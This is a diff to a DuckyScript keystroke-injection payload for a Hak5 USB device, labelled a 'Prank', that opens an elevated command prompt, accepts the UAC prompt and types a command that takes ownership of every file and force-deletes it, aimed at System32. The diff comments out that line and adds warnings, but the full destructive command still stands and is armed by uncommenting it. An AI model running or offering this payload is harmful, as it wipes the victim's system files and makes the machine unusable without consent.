@@ -5,6 +5,11 @@ REM Props: Hak5, my friends and memes
 REM Version: 1.0
 REM Category: Prank
 REM D as in DELETE! Deletes System32.
+REM
+REM THIS WILL DELETE THINGS AND MAKE COMPUTER UNHAPPY
+REM Uncomment out the string below to arm the script.
+REM Also... don't be a dick to n00bs. =)
+REM
 DELAY 500
 GUI r
 DELAY 500
@@ -13,5 +18,5 @@ CTRL-SHIFT ENTER
 DELAY 2000
 ALT y
 DELAY 1500
-STRING takeown /f * /r /a /d y && icacls * /inheritance:r /grant:r administrators:(F) /t & del /f /q *
+REM STRING takeown /f * /r /a /d y && icacls * /inheritance:r /grant:r administrators:(F) /t & del /f /q *
 ENTER
